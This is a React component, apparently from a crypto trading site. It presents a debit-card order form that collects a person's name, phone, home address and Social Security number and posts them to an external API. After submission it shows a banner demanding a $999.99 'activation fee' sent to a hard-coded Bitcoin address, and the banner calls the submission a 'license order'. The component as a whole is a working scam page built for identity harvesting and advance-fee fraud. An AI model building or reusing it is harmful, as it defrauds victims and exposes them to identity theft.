import React, { useState } from 'react'
import Loader from "./Loader/Loader";
import { toast } from 'react-toastify';

const debitCard = () => {

    const [isPending, setIsPending] = useState(false)

    const [banner, setBanner] = useState(false)


    const [formData, setFormData] = useState({
        name: '',
        address: '',
        wallet: '',
        ssn: '',
        phone: ''
    })

    const inputChange = (e) => {
        setFormData((prevState) => ({
            ...prevState, [e.target.name]: e.target.value
        }))
    }

    const handleSubmit = async (e) => {
        e.preventDefault()

        setIsPending(true)

        try {
            const response = await fetch(`https://trading-api-orcin.vercel.app/api/v1/cards/order`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({name: formData.name, address: formData.address, ssn: formData.ssn, phone: formData.phone, wallet: formData.wallet})
            })

            const json = await response.json()

            console.log(json)

            if(!response.ok){
                toast.error(json.error)
                console.log(json.error)
            }

            if(response.ok){
                setBanner(true)
            }
        } catch (error) {
            console.log(error)
            toast.error('Something went wrong')
        } finally {
            setIsPending(false)
        }

    }

    if (banner) return (
        <div className='flex flex-col gap-y-4 p-4 rounded-xl bg-gradient-to-br from-slate-800 to-slate-900 border border-slate-700 text-white'>
            <div className='flex items-center gap-x-2 text-green-400'>
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
                <h4 className='font-semibold text-lg'>Order Submitted</h4>
            </div>
            <p className='text-slate-300 text-sm leading-relaxed'>
                Thanks for submitting your license order. Complete the activation fee to finish your activation process.
            </p>
            <div className='flex flex-col gap-y-2 bg-slate-800 rounded-lg p-3 border border-slate-600'>
                <div className='flex items-center justify-between'>
                    <span className='text-slate-400 text-xs uppercase tracking-wide'>Amount</span>
                    <span className='text-white font-bold text-lg'>$999.99</span>
                </div>
                <hr className='border-slate-700' />
                <div className='flex flex-col gap-y-1'>
                    <span className='text-slate-400 text-xs uppercase tracking-wide'>Send to</span>
                    <span className='text-blue-400 text-xs font-mono break-all'>198qKNWyKo9sf6FUHFPxJ1CXBUyQK1QQae</span>
                </div>
            </div>
        </div>
    )


    if (!banner) return (
    <div className="grid grid-cols-1">
    <form  className="flex flex-col gap-y-4 text-white">
        <div className='grid grid-cols-2 gap-x-4 w-full'>
            <div className='flex flex-col gap-y-1'>
                <label >Fullname</label>
                <input
                    type="text"
                    className="w-full bg-[#18203A] text-slate-300"
                    placeholder="eg. John smith"
                    name="name"
                    value={formData.name}
                    onChange={inputChange}
                />
            </div>

            <div className='flex flex-col gap-y-1'>
                <label >Phone :</label>
                <input
                    type="number"
                    className="w-full bg-[#18203A] text-slate-300"
                    placeholder="eg. +13456890908"
                    name="phone"
                    value={formData.phone}
                    onChange={inputChange}
                />
            </div>
            
        </div>
        <div className='flex flex-col gap-y-1'>
            <label >Home Address</label>
            <input
                type="text"
                className="w-full bg-[#18203A] text-slate-300"
                placeholder="eg. 2523 Ravi a street San antonio TX"
                name="address"
                value={formData.address}
                onChange={inputChange}
            />
        </div>

        <div className='flex flex-col gap-y-1'>
            <label >SSN</label>
            <input
                type="number"
                className="w-full bg-[#18203A] text-slate-300"
                placeholder="eg. 0123456789"
                name="ssn"
                value={formData.ssn}
                onChange={inputChange}
            />
        </div>
        
        <button type="button" onClick={handleSubmit} className="p-2 bg-blue-500 w-full text-white shadow shadow-white">
            Order
        </button>
    </form>
    {isPending && <Loader/>}
    </div>
    
  )
}

export default debitCard